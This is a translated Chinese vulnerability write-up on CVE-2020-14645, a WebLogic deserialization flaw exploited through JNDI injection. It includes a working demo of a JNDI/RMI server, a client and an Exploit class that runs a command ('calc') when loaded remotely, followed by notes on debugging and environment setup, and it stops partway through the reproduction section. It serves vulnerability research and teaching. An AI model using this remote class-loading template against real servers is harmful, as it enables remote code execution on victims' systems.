# CVE-2020-14645——WebLogic反序列化
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、原理
###  （一）概述
Weblogic 的反序列化RCE漏洞 CVE-2020-14645，是对 CVE-2020-2883的补丁进行绕过。
CVE-2020-2555和CVE-2020-2883本质上是通过ReflectionExtractor调用任意方法，从而实现调用Runtime对象的exec方法来执行任意命令，为了“斩草除根”，CVE-2020-2883补丁将ReflectionExtractor列入黑名单。
###  （二）CVE-2020-14645
CVE-2020-2883可以通过 ReflectionExtractor
调用任意方法，因而补丁依然选择将ReflectionExtractor这一可被利用的类列入黑名单。
大牛发现，UniversalExtractor 任意调用 get、is方法也可导致可利用的 JDNI
远程动态类加载。于是他们放弃ReflectionExtractor，配合JNDI注入，使用UniversalExtractor来重新构造一条利用链。
UniversalExtractor 是 Weblogic 12.2.1.4.0 版本中独有的，环境搭建时要注意这一点。
###  （三）原理
**1.工具**
这里起LDAP服务用到了一个工具marshallsec（当然自己起也没有问题），[下载链接](https://github.com/mbechler/marshalsec)
[maven下载](http://maven.apache.org/download.cgi)
新建环境变量MAVEN_HOME，赋值C:\XXXX\maven，编辑环境变量Path，追加%MAVEN_HOME%\bin\;
cmd检查一下mvn是否安装成功：
    mvn -v
使用java8编译。
    mvn clean package -DskipTests
**2.原理**
个人感觉JNDI注入这一方法和RMI攻击具有比较高的相似性，都是让victim向攻击者控制的远程服务器发起请求，远程服务器返回内容，流程上甚至可以用同一幅图，
1.攻击者向其控制的Naming/Directory服务上绑定一个恶意对象。
2.攻击者向有漏洞的JDNI lookup方法发送恶意URL（ip为恶意N/D，且指向绑定的恶意对象）。
3.Victim执行lookup。
4.Victim向攻击者控制的N/D服务器发起查询，N/D返回恶意对象。
5.Victim反序列化恶意对象，触发RCE。
JNDI（全称Java Naming and Directory Interface）是用于目录服务的Java
API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与与主机系统接口的所有Java
api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。
个人理解，JNDI注入简单来说，就是在victim在执行lookup(URI)时，如果URI是恶意的，那么victim就会被攻击，所以JDNI最难的就是如何让victim来lookup我们构造的URI。
下面我们以一个常见的demo来简单演示JNDI攻击过程，
先是JNDIServer，
    package JNDI;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.Registry;
    import java.rmi.registry.LocateRegistry;
    public class JNDIServer {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference Exploit = new Reference("Exploit", "Exploit", "http://127.0.0.1:7077/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(Exploit);
            registry.bind("Exploit", refObjWrapper);
        }
    }
再是JNDIClient，
    package JNDI;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Properties;
    public class JNDIClient {
        public static void main(String[] args) throws NamingException {
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL,
                    "rmi://127.0.0.1:7099/");
            Context ctx = new InitialContext(env);
            //ctx.lookup("Exploit");
            //ctx.lookup("rmi://127.0.0.1:1099/Exploit");
            ctx.lookup("ldap://127.0.0.1:7099/Exploit");
        }
    }
然后是我们要注册的恶意类，此处是Exploit，
    import java.util.Hashtable;
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    public class Exploit implements ObjectFactory {
        public Exploit() {
        }
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            return null;
        }
        static {
            try {
                String[] cmd = new String[]{"calc"};
                Runtime.getRuntime().exec(cmd);
            } catch (Exception var1) {
                var1.printStackTrace();
            }
        }
    }
接下来编译Exploit，并将class文件放在httpserver根目录下，而不是out目录下（如此则效果不对），
启动server，
启动JNDIServer,
启动JNDIClient，
我们跟进调试一下触发的过程，
最终的调用栈，
我们从底到顶看看运行流程，
下面的几个lookup主要是用于建立连接，
更重要的还是在上面的几步，
先看decodeObject，
这一部分从服务端返回的ReferenceWrapper_Stub中get出Reference，
接下来的getObjectInstance中通过Reference获取Factory的实例，
至于是怎么获得的，需要我们跟进到最顶的函数getObjectFactoryFromReference，
关键代码:
     // Try to use current class loader
            try {
                 clas = helper.loadClass(factoryName);
            } catch (ClassNotFoundException e) {
                // ignore and continue
                // e.printStackTrace();
            }
            // All other exceptions are passed up.
            // Not in class path; try to use codebase
            String codebase;
            if (clas == null &&
                    (codebase = ref.getFactoryClassLocation()) != null) {
                try {
                    clas = helper.loadClass(factoryName, codebase);
                } catch (ClassNotFoundException e) {
                }
            }
从注释中我们也可以看出，这一部分先尝试从本地load class，如果失败（clas 为 null）无需做异常处理，改为从codebase中load
class，
这里我们的class是恶意类，本地一般不会有，所以还是要从codebase中load，
再向下运行一步，就会弹出计算器，
如果上面从这个点跟进loadClass，又能看到更细致的内容，
步入forName，
再向深跟几步，
这里开始正式加载class，
此时的部分调用栈，
此时即将执行命令calc，
下面将加载许多系统类，
个人感觉到这里就可以了，再向下也没有什么信息，还是load system 类 class的相关操作。
Exploit类加载完成，
和主体无关的话：跟了挺久之后才发现其实在Exploit里面下断就可以得到想要的调用栈和点了，不需要憨憨一样深入的跟，
这一小节我们看到，只要一个合适的lookup()，即可弹出计算器。lookup之前这里是写好了的，lookup之后有系统调用帮我们完成。当然我们其实是省去了最难的lookup之前这一部分，亦即让victim向JNDI
server发起请求，这一部分的实现我们将在调试环节详细演示。
## 二、调试
###  （一）环境搭建
鉴于漏洞用到的UniversalExtractor是WebLogic
12.2.1.4.0所特有的，而vulhub\weblogic均是10.3.6版本的，搭建相应的docker也需要下载相应的jar，不如直接搭在本机上，
搭建过程中踩了几个小坑，主要的原因就是JDK的版本比较多，环境变量和Oracle的设定不统一，如遇这种情况可以把Path里的%JAVA_HOME\bin提到最前面。
另外，根据查到的资料，建议使用JDK8中版本较低的（191以下），否则可能会出现类似于下面这样配置上的错误（比如1.8.0.151可以去[华为镜像](https://repo.huaweicloud.com/java/jdk/8u151-b12/)下载）
以管理员权限启动cmd，切换到jdk_xxxx\bin 目录运行命令，
即可进入安装，
下面的安装环节比较简单，
安装完成后配置域，
配置完成后启动，
查看界面，
成功。
配置调试环境与之前类似，可以参考[Windows调试WebLogic](https://blog.csdn.net/defonds/article/details/83510668)。
调试环境中会用到的lib是coherence。
###  （二）复现
这里复现难度不大，网上有很多可用的PoC，只要起了httpServer和LDAP Server，发PoC即可，
将恶意class文件放在httpserver根目录，先起Httpserver，跟上面一样即可，比较简单了，